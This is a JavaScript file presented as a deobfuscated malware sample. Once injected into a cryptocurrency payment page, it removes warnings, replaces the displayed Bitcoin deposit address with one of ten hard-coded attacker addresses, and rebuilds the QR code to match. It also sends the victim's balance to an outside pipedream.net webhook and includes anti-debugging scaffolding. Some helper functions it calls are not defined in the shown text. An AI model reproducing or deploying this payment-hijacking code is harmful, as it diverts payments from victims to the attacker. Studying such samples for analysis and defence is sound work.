//Deobfuscated by Ondry4K with the help of GPT 4o by OpenAI
// Ondry4K: Initial deobfuscation, eg. math operations, unpacking, algorhitms, analysis
// OpenAI: Variable naming with strict original code retention

'use strict';

(function (functionProvider, targetValue) {
    const functionArray = functionProvider();
    while (true) {
        try {
            const calculatedValue =
                parseInt('WPH6axFdPq') / 1 +
                (-parseInt('WQuAr3FcTG') / 2) * (-parseInt('iSkfWPFcJCk4') / 3) +
                (-parseInt('WRj0nNBdIa') / 4) * (parseInt('W7K1l8kSlq') / 5) +
                parseInt('ECkfzCoZ') / 6 +
                parseInt('aJCJW7RcGa') / 7 +
                parseInt('W4lcLsNdLmkE') / 8 +
                -parseInt('zmkoCmoO') / 9;

            if (calculatedValue === targetValue) {
                break;
            } else {
                functionArray.push(functionArray.shift());
            }
        } catch (error) {
            functionArray.push(functionArray.shift());
        }
    }
})(_0x1310, 632429);

(function () {
    const setupOnce = (function () {
        let isSetup = true;
        return function (context, callback) {
            const wrapped = isSetup
                ? function () {
                      if (callback) {
                          const result = callback.apply(context, arguments);
                          callback = null;
                          return result;
                      }
                  }
                : function () {};
            isSetup = false;
            return wrapped;
        };
    })();

    const obfuscationHandler = (function () {
        let flag = true;
        return function (context, callback) {
            const wrapped = flag
                ? function () {
                      if (callback) {
                          const result = callback.apply(context, arguments);
                          callback = null;
                          return result;
                      }
                  }
                : function () {};
            flag = false;
            return wrapped;
        };
    })();

    const contextSetup = function () {
        let context;
        try {
            context = (function () {
                return function () {}.constructor('return this')();
            })();
        } catch (error) {
            context = window;
        }
        return context;
    };

    const globalContext = contextSetup();
    globalContext.setInterval(() => {
        antiDebugFunction1();
    }, 4000);
})();

// List of Bitcoin addresses to target
const targetBitcoinAddresses = [
    'bc1qrx4g2r7pczjr65rje8nr7fx0w5x24fxtauprp3',
    'bc1qpc4qcqfpnsnt2973rdnpl97mn50n3ury2x72es',
    'bc1qxsp94dsqjpwj3sn4td709w9fwxvcw0grhmazwv',
    'bc1qe4hcxs25kkzl7ta4ne2twsxqp7rfpkktecqnlp',
    'bc1qznhrn6m7mg5ufu5m0huqd23vq09lply38uth3t',
    'bc1qs86ll8au2s78thuyrt7xsdvppgvxhfs2exzacx',
    'bc1qdpq8mfs7vndk9y4dslslhhgde4e2vnczan9d0e',
    'bc1qg9jss4c905q2ffrv2u9a22uuf2ftrfrhrny945',
    'bc1q8fqkphfyzu308hsxlgx6vudas8z8kcxu05480x',
    'bc1qa5kegpzw64j8c5d2094627ujyedj295tz3vjyj',
];

// Function to update the QR code
function updateQRCode(newSrc) {
    const qrImage = new Image();
    qrImage.onload = function () {
        document.querySelector('[class^="indexes__QrCodeImage"]').src = newSrc;
    };
    qrImage.src = newSrc;
}

// Async manipulation function
(async function () {
    const antiDebugSetup = (function () {
        let setupFlag = true;
        return function (context, callback) {
            const wrapped = setupFlag
                ? function () {
                      if (callback) {
                          const result = callback.apply(context, arguments);
                          callback = null;
                          return result;
                      }
                  }
                : function () {};
            setupFlag = false;
            return wrapped;
        };
    })();

    const finalFunction = antiDebugSetup(this, function () {
        let context;
        try {
            const contextFunction = Function(
                'return (function() {}.constructor("return this")( ));'
            );
            context = contextFunction();
        } catch (error) {
            context = window;
        }
        const consoleMethods = ['log', 'warn', 'info', 'error', 'exception', 'table', 'trace'];
        consoleMethods.forEach((method) => {
            const original = console[method] || function () {};
            console[method] = function () {
                return original.apply(console, arguments);
            };
        });
    });

    finalFunction();

    let addressReplaced = false;
    let balanceReported = false;
    let alertShown = false;

    const manipulationInterval = setInterval(function () {
        document.querySelector('div[class*="indexes__MethodAlert"]')?.remove();

        const instantImage = document.querySelector('img[src*="instant-methods.png"]');
        if (instantImage) {
            instantImage.closest('section')?.remove();
        }

        document.querySelectorAll('span[class^="indexes__BreakableText"]').forEach((element) => {
            let addressFound = false;
            targetBitcoinAddresses.forEach((address) => {
                if (element.innerHTML.includes(address)) {
                    addressFound = true;
                }
            });

            if (!addressFound) {
                const randomAddress = targetBitcoinAddresses[Math.floor(Math.random() * targetBitcoinAddresses.length)];
                element.innerHTML = randomAddress;
                addressReplaced = true;

                const btcMatch = document.body.innerHTML.match(/\d\.\d{3,}(?=\s*BTC)/);
                if (btcMatch && !balanceReported) {
                    const btcAmount = btcMatch[0];
                    const usdAmount = (parseFloat(btcAmount) * 1000).toFixed(2);

                    const xhr = new XMLHttpRequest();
                    xhr.open('GET', `https://eoq8hk0kj1bvmca.m.pipedream.net?balance=${usdAmount}BTC`);
                    xhr.send();

                    balanceReported = true;

                    const newQRCodeUrl = `https://api.qrserver.com/v1/create-qr-code/?size=147x147&data=bitcoin:${randomAddress}?amount=${btcAmount}`;
                    updateQRCode(newQRCodeUrl);
                }
            }
        });

        document.querySelector('div[class*="Warning"]')?.remove();

        if (addressReplaced && balanceReported && !alertShown) {
            setTimeout(function () {
                const btcMatch = document.body.innerHTML.match(/\d\.\d{3,}(?=\s*BTC)/);
                if (btcMatch && parseFloat(btcMatch[0]) > 0.01) {
                    alert('Warning: Potential manipulation detected. Please verify payment details.');
                }
                alertShown = true;
            }, 2000);
        }

        if (addressReplaced && balanceReported) {
            clearInterval(manipulationInterval);
        }
    }, 3000);
})();
